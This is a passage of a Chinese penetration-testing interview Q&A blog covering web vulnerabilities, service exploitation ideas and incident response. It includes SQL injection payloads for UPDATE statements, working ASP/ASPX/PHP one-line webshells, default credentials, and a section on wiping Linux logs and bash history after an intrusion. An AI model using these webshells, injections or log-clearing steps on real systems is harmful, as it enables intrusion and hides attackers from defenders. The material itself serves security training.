href="#OWASP-漏洞都有哪些" class="headerlink" title="OWASP 漏洞都有哪些**"></a>OWASP 漏洞都有哪些**</h2><ol><li>SQL 注入防护方法</li><li>失效的身份认证和会话管理</li><li>跨站脚本攻击 XSS</li><li>直接引用不安全的对象</li><li>安全配置错误配置</li><li>敏感信息泄露</li><li>缺少功能级的访问控制</li><li>跨站请求伪造 CSRF</li><li>使用含有已知漏洞的组件</li><li>未验证的重定向和转发</li></ol><h2 id="SQL-里面只有-update-怎么利用"><a href="#SQL-里面只有-update-怎么利用" class="headerlink" title="SQL 里面只有 update 怎么利用**"></a>SQL 里面只有 update 怎么利用**</h2><p>先理解这句 SQL：<code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code><br>如果此 SQL 被修改成以下形式，就实现了注入。</p><ol><li><p>修改 homepage 值为 <code>http://xxx.net&#39;, userlevel=&#39;3</code><br>之后 SQL 语句变为：<code>UPDATE user SET password=&#39;mypass&#39;, homepage=&#39;http://xxx.net&#39;, userlevel=&#39;3&#39; WHERE id=&#39;$id&#39;</code><br>userlevel 为用户级别</p></li><li><p>修改 password 值为 <code>mypass&#39;)&#39; WHERE username=&#39;admin&#39;#</code><br>之后 SQL 语句变为：<code>UPDATE user SET password=&#39;MD5(mypass)&#39; WHERE username=&#39;admin&#39;#&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;$id&#39;</code></p></li><li><p>修改 id 值为 <code>&#39; OR username=&#39;admin&#39;</code><br>之后 SQL 语句变为：<code>UPDATE user SET password=&#39;MD5($password)&#39;, homepage=&#39;$homepage&#39; WHERE id=&#39;&#39; OR username=&#39;admin&#39;</code></p></li></ol><h3 id="讲解："><a href="#讲解：" class="headerlink" title="讲解："></a>讲解：</h3><p>这段内容描述了在SQL注入攻击中，如何利用<code>UPDATE</code>语句进行注入攻击。SQL注入是一种常见的网络攻击方式，攻击者通过在SQL语句中插入恶意代码，以获取、修改或删除数据库中的数据。</p><ol><li><strong>修改<code>homepage</code>值</strong>：通过将<code>homepage</code>参数修改为包含单引号的URL，可以破坏原有的SQL语句结构，使得SQL语句执行攻击者想要的操作。例如，添加<code>userlevel</code>参数可以插入额外的SQL命令。</li><li><strong>修改<code>password</code>值</strong>：通过在<code>password</code>参数中插入单引号和注释符号<code>#</code>，可以注释掉<code>WHERE</code>子句后面的内容，使得<code>WHERE</code>条件失效，从而影响所有用户。</li><li><strong>修改<code>id</code>值</strong>：通过将<code>id</code>参数修改为<code>&#39; OR username=&#39;admin&#39;</code>，可以绕过<code>WHERE</code>条件，使得<code>UPDATE</code>语句对所有用户名为<code>admin</code>的用户生效。</li></ol><h2 id="DOM-型和-XSS-自动化测试或人工测试"><a href="#DOM-型和-XSS-自动化测试或人工测试" class="headerlink" title="DOM 型和 XSS 自动化测试或人工测试**"></a>DOM 型和 XSS 自动化测试或人工测试**</h2><p>人工测试思路：找到类似 <code>document.write</code>、<code>innerHTML</code> 赋值、<code>outerHTML</code> 赋值、<code>window.location</code> 操作、写 <code>javascript</code> 后内容、<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code> 等直接执行之类的函数点。<br>找到其变量，回溯变量来源观察是否可控，是否经过安全函数。自动化测试参考道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否存在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个 <code>javascript</code> 解析器，否则会漏掉一些通过 <code>js</code> 执行带入的部分内容。</p><h2 id="对于-XSS-怎么修补建议"><a href="#对于-XSS-怎么修补建议" class="headerlink" title="对于 XSS 怎么修补建议"></a>对于 XSS 怎么修补建议</h2><p>输入点检查：对用户输入的数据进行合法性检查，使用 filter 过滤敏感字符或对输入进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。<br>输出点检查：对变量输出到 HTML 页面中时，对输出内容进行编码转义，输出在 HTML 中时，对其进行 HTMLEncode，如果输出在 Javascript 脚本中时，对其进行 JavascriptEncode。对使用 JavascriptEncode 的变量都放在引号中并转义危险字符，data 部分就无法逃逸出引号外成为 code 的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML 的解析会优先于 Javascript 的解析，编码的方式也需要考虑清楚。<br>除此之外，还有做 HTTPOnly 对 Cookie 劫持做限制。</p><h2 id="CSRF-的防御"><a href="#CSRF-的防御" class="headerlink" title="CSRF 的防御"></a>CSRF 的防御</h2><p>验证 Referer、添加 token</p><h2 id="token-和-referer-做横向对比，谁安全等级高"><a href="#token-和-referer-做横向对比，谁安全等级高" class="headerlink" title="token 和 referer 做横向对比，谁安全等级高"></a>token 和 referer 做横向对比，谁安全等级高</h2><p>token 安全等级更高，因为并不是任何服务器都可以取得 referer，如果从 HTTPS 跳到 HTTP，也不会发送 referer。并且 FLASH 一些版本中可以自定义 referer。但是 token 的话，要保证其足够随机且不可泄露。</p><h2 id="对-referer-的验证，从什么角度去做？如果做，怎么杜绝问题"><a href="#对-referer-的验证，从什么角度去做？如果做，怎么杜绝问题" class="headerlink" title="对 referer 的验证，从什么角度去做？如果做，怎么杜绝问题"></a>对 referer 的验证，从什么角度去做？如果做，怎么杜绝问题</h2><p>对 header 中的 referer 的验证，一个是空 referer，一个是 referer 过滤或者检测不完善。为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p><h2 id="针对-token-攻击，你会对-token-的哪方面进行测试"><a href="#针对-token-攻击，你会对-token-的哪方面进行测试" class="headerlink" title="针对 token 攻击，你会对 token 的哪方面进行测试"></a>针对 token 攻击，你会对 token 的哪方面进行测试</h2><p>针对 token 的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击。信息泄露有可能是缓存、日志、get，也有可能是利用跨站。很多跳转登录的都依赖 token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了。<br>另外也可以结合着其它业务来描述 token 的安全性及设计不好怎么被绕过比如抢红包业务之类的。</p><h2 id="简述你知道的一句话木马"><a href="#简述你知道的一句话木马" class="headerlink" title="简述你知道的一句话木马**"></a>简述你知道的一句话木马**</h2><p>ASP：<code>&lt;%eval request(&quot;cmd&quot;)%&gt;</code><br>ASP.NET：（aspx）<code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;cmd&quot;],&quot;unsafe&quot;)%&gt;</code><br>PHP：<code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;</code></p><h2 id="假设渗透时发现服务器开了-21-80-445-3306-11211-端口，你有什么渗透思路"><a href="#假设渗透时发现服务器开了-21-80-445-3306-11211-端口，你有什么渗透思路" class="headerlink" title="假设渗透时发现服务器开了 21, 80, 445, 3306, 11211 端口，你有什么渗透思路"></a>假设渗透时发现服务器开了 21, 80, 445, 3306, 11211 端口，你有什么渗透思路</h2><p>针对 21 端口：21 端口开放表明运行 FTP 服务，可以尝试对 FTP 进行爆破和尝试匿名 anonymous&#x2F;空登陆。以及使用 MS12-073 的攻击尝试。<br>针对 80 端口：80 端口对应 web 服务，可通过信息收集，分析出去中间件类型和版本，后端语言类型。还有 CMS 类型，看是否有已知漏洞可利用。若无，对 Web 站点进行渗透测试，查看是否存在注入等漏洞。<br>针对 445 端口：445 端口对应网络共享 SMB 服务，可尝试利用 ms08-067, ms17-010 等溢出漏洞对服务器进行攻击。也可以尝试使用 IPC$进行攻击。<br>针对 3306 mysql 端口：3306 端口也可以采用爆破的方式。成功后可以用 mysql 写 webshell，或者构造 VBS 写入服务器启动项，带服务器重启就可以添加管理员账号和打开 3389 端口。<br>针对 11211 端口：11211 端口是 memcached 服务的端口。memcached 默认情况下存在未授权访问漏洞，telnet ip 就可以获得服务器敏感信息。对进一步渗透提供帮助。</p><h2 id="假设渗透时发现服务器开放了-22、8088、8161、6379-端口，你有什么渗透思路"><a href="#假设渗透时发现服务器开放了-22、8088、8161、6379-端口，你有什么渗透思路" class="headerlink" title="假设渗透时发现服务器开放了 22、8088、8161、6379 端口，你有什么渗透思路"></a>假设渗透时发现服务器开放了 22、8088、8161、6379 端口，你有什么渗透思路</h2><ol><li>22 端口是 Linux 服务器的 SSH 远程登录协议，一般使用爆破的方法</li><li>8088 端口是 Hadoop Yarn 资源管理系统 REST API存在未授权漏洞.通过 curl -v -X POST申请新的application，构造任务后即可在相应目录生成webshell</li><li>8161 运行着 Apache ActiveMQ。其 Console 存在默认端口和默认密码&#x2F;未授权访问(默认密码为 admin:admin)。当 ActiveMQ 开启 PUT 请求时(默认开启)，构造好 Payload(即不存在的目录)，Response 会返回相应的物理路径信息。ActiveMQ 默认开启 PUT 方法，当 fileserver 存在时我们可以上传 jspwebshell。ActiveMQ 除了支持 PUT 协议之外，还支持 MOVE 协议，可导致任意文件移动漏洞。</li><li>6379 是 Redis 数据库的默认端口，Redis 未授权访问可以导致未授权访问，通过连接 redis（redis-cli） 可直接写入 webshell。写入 webshell 后利用冰蝎、蚁剑等工具连接，获取 shell。以及写入 SSH 公钥，获取服务器权限。具体操作可参考相关工具文档。</li></ol><h2 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h2><ol><li><p>信息收集<br>a、服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）<br>b、网站指纹识别（包括，cms，cdn，证书等），dns记录<br>c、whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）<br>d、子域名收集，旁站，C段等<br>e、google hacking 针对化搜索，pdf文件，中间件版本，弱口令扫描等<br>f、扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等<br>g、传输协议，通用漏洞，exp，github源码等</p></li><li><p>漏洞挖掘<br>a、浏览网站，看看网站规模，功能，特点等<br>b、端口，弱口令，目录等扫描，对响应的端口进行漏洞探测，比如 rsync,心脏滴血，mysql,ftp,ssh 弱口令等。<br>c、XSS，SQL 注入，上传，命令注入，CSRF，cookie 安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</p></li><li><p>漏洞利用&amp;权限提升<br>a、mysql 提权，serv-u 提权，oracle 提权<br>b、windows 溢出提权<br>c、linux 脏牛，内核漏洞提权</p></li><li><p>清除测试数据&amp;输出报告<br>日志，测试数据的清理<br>总结，输出渗透测试报告，附修复方案</p></li></ol><h2 id="入侵-Linux-后需要清除哪些日志"><a href="#入侵-Linux-后需要清除哪些日志" class="headerlink" title="入侵 Linux 后需要清除哪些日志"></a>入侵 Linux 后需要清除哪些日志</h2><p>1）web 日志如 apache 的 access.log,error.log。直接将日志清除过于明显，一般使用 sed 进行定向清除：sed -i -e ‘&#x2F;192.169.1.1&#x2F;d’<br>2）history 命令的清除，也是对 ~&#x2F;.bash_history 进行定向清除<br>3）wtmp 日志的清除，&#x2F;var&#x2F;log&#x2F;wtmp<br>4）登录日志清除 &#x2F;var&#x2F;log&#x2F;secure</p><h2 id="域内横向移动"><a href="#域内横向移动" class="headerlink" title="域内横向移动"></a>域内横向移动</h2><p>在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows 操作系统的整个内网环境，控制域环境下的全部机器。</p><h2 id="Windows、linux-反弹-shell-的方式"><a href="#Windows、linux-反弹-shell-的方式" class="headerlink" title="Windows、linux 反弹 shell 的方式"></a>Windows、linux 反弹 shell 的方式</h2><p>Windows: powershell 反弹 shell、powercat 反弹 shell<br>Linux: bash 反弹 shell、netcat 反弹 shell、wget 反弹 shell、python 反弹 shell、php 反弹 shell</p><h2 id="子域名搜集的方式"><a href="#子域名搜集的方式" class="headerlink" title="子域名搜集的方式"></a>子域名搜集的方式</h2><p>可以从 js 文件中寻找、搜索引擎（谷歌语法、fofa）、证书查询、使用 crossdomain.xml 文件、dns 记录、枚举、域传送漏洞。</p><h2 id="Oneforall-搜索的原理"><a href="#Oneforall-搜索的原理" class="headerlink" title="Oneforall 搜索的原理"></a>Oneforall 搜索的原理</h2><p>利用证书透明度、网上爬虫档案、DNS 数据集、DNS 查询、威胁情报平台数据、搜索引擎、常规检查来进行子域名搜集的。</p><h2 id="拿到一个待检测的站，你觉得应该先做什么"><a href="#拿到一个待检测的站，你觉得应该先做什么" class="headerlink" title="拿到一个待检测的站，你觉得应该先做什么"></a>拿到一个待检测的站，你觉得应该先做什么</h2><p>1）获取域名的 whois 信息，获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯。利用已有信息生成专用字典。<br>2）查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的 cms 或者其他漏洞。<br>3）查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，比如 IIS，APACHE,NGINX 的解析漏洞。<br>4）查看 IP，进行 IP 地址端口扫描，对响应的端口进行漏洞探测，比如 rsync，心脏滴血，mysql,ftp,ssh 弱口令等。<br>5）扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如 php 探针。<br>6）google hack 进一步探测网站的信息，后台，敏感文件。</p><p>剩下就是上面的测试流程了</p><h2 id="渗透测试中常见的端口"><a href="#渗透测试中常见的端口" class="headerlink" title="渗透测试中常见的端口"></a>渗透测试中常见的端口</h2><p>1）web 类（web 漏洞&#x2F;敏感目录）第三方通用组件漏洞 struts thinkphp jboss ganglia Zabbix：80 web、80-89 web、8000-9090 web<br>2）数据库类（扫描弱口令）：1433 MSSQL、1521 Oracle、3306 MySQL、5432 PostgreSQL<br>3）特殊服务类（未授权&#x2F;命令执行类&#x2F;漏洞）：443 SSL 心脏滴血、873 Rsync 未授权、5984 CouchDB <a href="http://xxx:5984/_utils/%E3%80%816379">http://xxx:5984/_utils/、6379</a> redis 未授权、7001,7002 WebLogic 默认弱口令，反序列、9200,9300 elasticsearch 参考 WooYun：多玩某服务器 ElasticSearch 命令执行漏洞、11211 memcache 未授权访问、27017,27018 Mongodb 未授权访问、50000 SAP 命令执行、50070,50030 hadoop 默认端口未授权访问<br>4）常用端口类（扫描弱口令&#x2F;端口爆破）：21 ftp、22 SSH、23 Telnet、2601,2604 zebra 路由，默认密码 zebra、3389 远程桌面</p><h2 id="12、简述-nmap-参数和不同方法扫描的优缺点"><a href="#12、简述-nmap-参数和不同方法扫描的优缺点" class="headerlink" title="12、简述 nmap 参数和不同方法扫描的优缺点"></a>12、简述 nmap 参数和不同方法扫描的优缺点</h2><p>-ST—TCP(全)连接扫描，准确但留下大量日志记录<br>-SS—TCP SYN(半)扫描，速度较快，不会留下日志<br>-sN—null 扫描，标志位全为 0，不适用 Windows<br>-sF—FIN 扫描，标志位 FIN&#x3D;1，不适用 Windows<br>-O—查看目标主机版本<br>-sV—探测服务版本<br>-A—全面扫描</p><h2 id="简述-Windows-及-linux-平台提权方法"><a href="#简述-Windows-及-linux-平台提权方法" class="headerlink" title="简述 Windows 及 linux 平台提权方法"></a>简述 Windows 及 linux 平台提权方法</h2><p>Windows 根据系统中没有打的补丁编号直接找 exp 提权；<br>linux 通过系统内核提权，uname -r 查看系统内核版本，查找漏洞下载 exp 提权。</p><h2 id="简述-linux-系统中查询日志方法"><a href="#简述-linux-系统中查询日志方法" class="headerlink" title="简述 linux 系统中查询日志方法"></a>简述 linux 系统中查询日志方法</h2><p>登录日志 last；<br>操作日志 history；<br>启动信息和错误日志&#x2F;var&#x2F;log&#x2F;message；<br>安全日志&#x2F;var&#x2F;log&#x2F;secure；<br>邮件日志&#x2F;var&#x2F;log&#x2F;maillog；<br>计划任务日志&#x2F;var&#x2F;log&#x2F;cron；</p><h2 id="描述一下-DeDecms-任意密码重置漏洞"><a href="#描述一下-DeDecms-任意密码重置漏洞" class="headerlink" title="描述一下 DeDecms 任意密码重置漏洞"></a>描述一下 DeDecms 任意密码重置漏洞</h2><p>DeDecms 是用户使用最多的 PHP 类 cms 系统。DeDecms 的任意密码重置漏洞通过遍历 UID 的方式获取返回的静态 gourl 跳转地址，而 CMS 未对更改密码的跳转地址进行参数隐藏导致更改密码的临时密码被泄露，泄露以后构造 URL 传入临时密码，可以不需要任何验证即可更改任意用户密码。</p><h2 id="常见的网站服务器容器"><a href="#常见的网站服务器容器" class="headerlink" title="常见的网站服务器容器"></a>常见的网站服务器容器</h2><p>IIS、Apache、nginx、Lighttpd、Tomcat</p><h2 id="如何检测-iis-短文件名漏洞"><a href="#如何检测-iis-短文件名漏洞" class="headerlink" title="如何检测 iis 短文件名漏洞"></a>如何检测 iis 短文件名漏洞</h2><p>方法一：使用 iis_shortname_Scan.py 脚本进行检测<br>用法：python IIS_shortname_Scan.py <a href="http://www.target.com/">http://www.target.com/</a><br>方法二：使用 nmap，命令为 nmap -p 80 –script http-iis-short-name-brute 192.168.0.1&#x2F;24</p><p>IIS短文件名漏洞是由于HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（~）波浪号引起的，它允许远程攻击者在Web根目录下公开文件和文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件，并获取有关应用程序基础结构的信息。<br>检测原理基于IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。通过这种方式，攻击者可以尝试枚举出服务器中存在的短文件名，再根据短文件名猜测出最终的文件名称信息。该工具通过尝试访问不同组合的短文件名来检测IIS服务器是否容易受到短文件名漏洞的影响。</p><h2 id="如何判别-web-服务器是-windows-还是-linux"><a href="#如何判别-web-服务器是-windows-还是-linux" class="headerlink" title="如何判别 web 服务器是 windows 还是 linux"></a>如何判别 web 服务器是 windows 还是 linux</h2><p>方法一：nmap 带上 -O 参数<br>方法二：查看 http 报头 Server 字段<br>方法三：Windows 对于大小写不敏感，替换某个字母为大写返回正常为 Windows，反之 Linux<br>方法四：TTL 返回值，TTL 为 64，有很大可能性为 Linux，TTL 为 128，有很大可能性为 Windows，TTL 为 255，有很大可能性为 UNIX（可修改 TTL）<br>参考链接：<a href="https://www.zhihu.com/question/20375910">https://www.zhihu.com/question/20375910</a></p><h2 id="Tomcat-漏洞利用"><a href="#Tomcat-漏洞利用" class="headerlink" title="Tomcat 漏洞利用"></a>Tomcat 漏洞利用</h2><p>弱口令进入后台部署 war 包 getshell、put 方法任意文件上传 (CVE-2017-12615)、tomcat ajp 协议文件包含漏洞</p><h2 id="Weblogic-后台默认密码"><a href="#Weblogic-后台默认密码" class="headerlink" title="Weblogic 后台默认密码"></a>Weblogic 后台默认密码</h2><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件。WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。它将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。WebLogic Server以其高扩展的架构体系闻名于业内，包括客户机连接的共享、资源pooling以及动态网页和EJB组件群集。它支持完整的Java EE规范，包括JSP、Servlet、EJB（Enterprise JavaBeans）、JMS（Java Message Service）、JNDI（Java Naming and Directory Interface）、JTA（Java Transaction API）等，适用于大规模分布式应用。<br>weblogic&#x2F;weblogic</p><h2 id="Weblogic-的-CVE-2019-2725-漏洞描述与修复方案"><a href="#Weblogic-的-CVE-2019-2725-漏洞描述与修复方案" class="headerlink" title="Weblogic 的 CVE-2019-2725 漏洞描述与修复方案"></a>Weblogic 的 CVE-2019-2725 漏洞描述与修复方案</h2><p>漏洞描述：由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。</p><p>修复建议：官方目前已发布针对此漏洞的紧急修复补丁，可以采取以下 4 种方式进行防护。<br>1）及时打上官方 CVE-2019-2725 补丁包<br>官方已于 4 月 26 日公布紧急补丁包，下载地址：<br><a href="https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-546295.html?from=timeline">https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-546295.html?from=timeline</a></p><p>2）升级SDK版本</p><p>3）配置 URL 访问控制策略<br>部署于公网的 WebLogic 服务器，可通过 ACL 禁止对 &#x2F;_async&#x2F; 及 &#x2F;wls-wsat&#x2F; 路径的访问。</p><p>4）删除不安全文件<br>删除 wls9_async_response.war 与 wls-wsat.war 文件及相关文件夹，并重启 Weblogic 服务。具体文件路径如下：<br>10.3.x 版本：<br>\MiddleWare\server_10.3\server\lib%DOMAIN_HOME%\servers\AdminServer\tmp_WL_internal<br>%DOMAIN_HOME%\servers\AdminServer\tmp.internal\</p><p>12.1.3 版本：<br>\MiddleWare\Oracle_Home\oracle_common\modules%DOMAIN_HOME%\servers\AdminServer\tmp.internal%DOMAIN_HOME%\servers\AdminServer\tmp_WL_internal<br>注）wls9_async_response.war 及 wls-wsat.war 属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle 官方不建议对其进行此类操作。若在直接删除此包的情况下应用出现问题，将无法得到 Oracle 产品部门的技术支持。请用户自行进行影响评估，并对此文件进行备份后，再执行此操作。</p><h2 id="假设现-weblogic-爆发-0day-漏洞，需要你紧急排查影响，说说你的看法？"><a href="#假设现-weblogic-爆发-0day-漏洞，需要你紧急排查影响，说说你的看法？" class="headerlink" title="假设现 weblogic 爆发 0day 漏洞，需要你紧急排查影响，说说你的看法？"></a>假设现 weblogic 爆发 0day 漏洞，需要你紧急排查影响，说说你的看法？</h2><p>题目描述：假设现 weblogic 爆发 0day 漏洞，weblogic 的 &#x2F;vulpath 存在漏洞，所有存在 <a href="http://ip:port/vulpath">http://ip:port/vulpath</a> 路径的系统均受影响，现已完成目标资产的端口扫描，需要你紧急排查受影响资产，请说说你的做法<br>假设端口扫描时已有版本识别，挑出所有 weblogic 服务。存在 IP+端口地址后，通过 url 批量检测脚本 httpCatcher.py 检测出是否存在 ip:port&#x2F;vulpath 路径 200 返回值，返回即为受影响资产。<br>用法为：将 IP+端口存在一个 ip.txt 文件</p><p>152.136.121.47:808<br>39.108.141.35:443<br>39.108.141.35:80</p><p>然后修改 httpCatcher.py 的路径改为 &#x2F;vulpath</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line">outfile = sys.argv[<span class="number">2</span>]</span><br><span class="line">path = <span class="string">&#x27;/&#x27;</span>  <span class="comment">##改为 &#x27;/vulpath&#x27;</span></span><br><span class="line">addrlist = []</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        addrlist = f.readlines()</span><br></pre></td></tr></table></figure><p>输入命令 python httpCatcher.py ip.txt 1.csv 即可得到 1.csv 文件，查看即可</p><h2 id="常见中间件的配置文件路径"><a href="#常见中间件的配置文件路径" class="headerlink" title="常见中间件的配置文件路径"></a>常见中间件的配置文件路径</h2><p>apache (&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;)<br>nginx (&#x2F;etc&#x2F;nginx)<br>iis7 (C:\Windows\System32\inetsrv\config)</p><h2 id="Struts2-反序列化漏洞"><a href="#Struts2-反序列化漏洞" class="headerlink" title="Struts2 反序列化漏洞"></a>Struts2 反序列化漏洞</h2><p>struts 是 java 的 web 框架。采取 OGNL 表达式，处理 view 层数据字符串到 controller 层转换成 java 对象，影响比较大的漏洞主要为 S2-045\046，通过 Content-Type 这个 header 头，进而执行命令，通过 Struts2 对错误消息处理进行回显。</p><h2 id="Zookeeper-默认的端口"><a href="#Zookeeper-默认的端口" class="headerlink" title="Zookeeper 默认的端口"></a>Zookeeper 默认的端口</h2><p>2181：对 cline 端提供服务<br>3888：选举 Leader 使用<br>2888：集群内机器通讯使用（Leader 监听此端口）</p><h2 id="Zookeeper-未授权访问的检查方法"><a href="#Zookeeper-未授权访问的检查方法" class="headerlink" title="Zookeeper 未授权访问的检查方法"></a>Zookeeper 未授权访问的检查方法</h2><p>telnet zookeeper 端口，输入 envi，回显路径等信息则存在 zookeeper 未授权访问漏洞</p><h2 id="请列出-Zookeeper-未授权访问漏洞的修复方案"><a href="#请列出-Zookeeper-未授权访问漏洞的修复方案" class="headerlink" title="请列出 Zookeeper 未授权访问漏洞的修复方案"></a>请列出 Zookeeper 未授权访问漏洞的修复方案</h2><ol><li>禁止将 zookeeper 暴露在公网</li><li>使用 iptables 对端口进行访问控制</li><li>添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</li><li>绑定指定 IP 访问</li></ol><h2 id="如何检查-mongodb-未授权访问漏洞"><a href="#如何检查-mongodb-未授权访问漏洞" class="headerlink" title="如何检查 mongodb 未授权访问漏洞"></a>如何检查 mongodb 未授权访问漏洞</h2><p>方法一：使用 mongodb_unauth.py 脚本进行处理，将 ip 地址放进 target.txt，用法为：python mongodb_unauth.py target.txt<br>方法二：使用 nmap 插件，命令为：nmap -p 27017 –script mongodb-info 192.168.0.1&#x2F;24</p><h2 id="Redis-未授权漏洞产生原因"><a href="#Redis-未授权漏洞产生原因" class="headerlink" title="Redis 未授权漏洞产生原因"></a>Redis 未授权漏洞产生原因</h2><p>Redis 默认情况下会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p><h2 id="Redis-未授权漏洞利用条件"><a href="#Redis-未授权漏洞利用条件" class="headerlink" title="Redis 未授权漏洞利用条件"></a>Redis 未授权漏洞利用条件</h2><p>Redis 服务以 root 账户运行、无密码或弱密码进行认证、监听在 0.0.0.0 公网上</p><h2 id="Redis-未授权漏洞利用"><a href="#Redis-未授权漏洞利用" class="headerlink" title="Redis 未授权漏洞利用"></a>Redis 未授权漏洞利用</h2><ol><li>通过 Redis 的 INFO 命令，可以查看服务器相关的参数和敏感信息，为攻击者的后续渗透做铺垫</li><li>上传 SSH 公钥获得 SSH 登录权限</li><li>通过 crontab 反弹 shell</li><li>slave 主从模式利用</li></ol><h2 id="Hadoop-组件与相关端口"><a href="#Hadoop-组件与相关端口" class="headerlink" title="Hadoop 组件与相关端口"></a>Hadoop 组件与相关端口</h2><p>NameNode：类似于 Linux 中的 root 根目录，用于管理数据块映射、处理客户端的读写请求、配置副本策略和管理 HDFS 的名称空间；端口号 50070<br>DataNode：在 HDFS 中真正存储数据，负责存储 client 发来的数据块 block、执行数据块的读写操作<br>ResourceManager：YARN 集群主控节点，负责协调和管理整个集群的资源；端口号 8088<br>NodeManager：负责管理一个 YARN 集群中的每一个节点；端口号 8042<br>HBase：分布式的开源数据库，依赖 Hadoop 生态系统；端口号 16010<br>Kafka：分布式消息中间件<br>HDFS：Hadoop Distributed File System，Hadoop 分布式文件系统<br>YARN：Hadoop 资源管理器<br>Kylin：开源的分布式分析型数据仓库，主要提供 Hadoop&#x2F;Spark 之上的 SQL 查询接口及多维分析等功能<br>Hadoop 的框架最核心的设计就是：HDFS 和 MapReduce。HDFS 为海量的数据提供了存储，则 MapReduce 为海量的数据提供了计算。</p><h2 id="假设客户中了-GhostPetya-勒索病毒，请描述需要采取的应急解决方案"><a href="#假设客户中了-GhostPetya-勒索病毒，请描述需要采取的应急解决方案" class="headerlink" title="假设客户中了 GhostPetya 勒索病毒，请描述需要采取的应急解决方案"></a>假设客户中了 GhostPetya 勒索病毒，请描述需要采取的应急解决方案</h2><ol><li><p>未部署端点安全的终端应急解决方案</p><ol><li>做好重要文件的备份工作（非本地备份）。</li><li>开启系统防火墙。</li><li>利用系统防火墙高级设置阻止向 445 端口进行连接（该操作会影响使用 445 端口的服务）。</li><li>打开系统自动更新，并检测更新进行安装。</li><li>停止使用 Windows XP、Windows 2003 等微软已不再提供安全更新的操作系统。</li><li>如无需使用共享服务建议关闭该服务。</li></ol></li><li><p>已部署端点安全的终端应急解决方案</p><ol><li>如果用户已经部署终端管理类产品，可通过终端管理软件进行内网打补丁。</li><li>通过主机防火墙关闭入栈流量。主机防火墙关闭到 445 出栈流量。</li><li>开启文件审计，只允许 word.exe，explorer.exe 等对文件访问。</li></ol></li><li><p>已经感染应急解决方案</p><ol><li>断开网络连接，阻止进一步扩散。优先检查未感染主机的漏洞状况（可直接联系网御星云公司，提供免费检测工具使用），做好漏洞加固工作后方可恢复网络连接。</li><li>已经感染终端，根据终端数据类型决定处置方式，如果重新安装系统则建议完全格式化</li></ol></li><li><p>预防措施：</p><ol><li><p>打补丁：及时给系统打补丁，修复漏洞。</p></li><li><p>装杀软：安装杀毒软件，及时更新病毒库。开启防火墙，并升级到最新版本，阻止勒索病毒与其 C&amp;C 服务器通信。</p></li><li><p>做备份：定期对重要文件以及数据库做非本地备份。电脑开启系统备份，并添加保护（这样可通过卷影备份将系统恢复到被加密之前的状态）。</p></li><li><p>备份恢复：如果事先已对关键文件做了备份，在确保已清除病毒情况下可做数据备份恢复。如果卷影备份未被勒索病毒删除，可通过卷影备份将系统恢复到未感染勒索病毒的时间点。</p></li><li><p>改密码：使用长度大于 10 位的复杂密码。</p></li><li><p>加限制：禁用 GUEST 来宾用户。尽量不要使用局域网共享，或把共享磁盘设置为只读属性，不允许局域网用户改写文件。尽量关闭不必要的端口，如：445、135、139、3389、5900 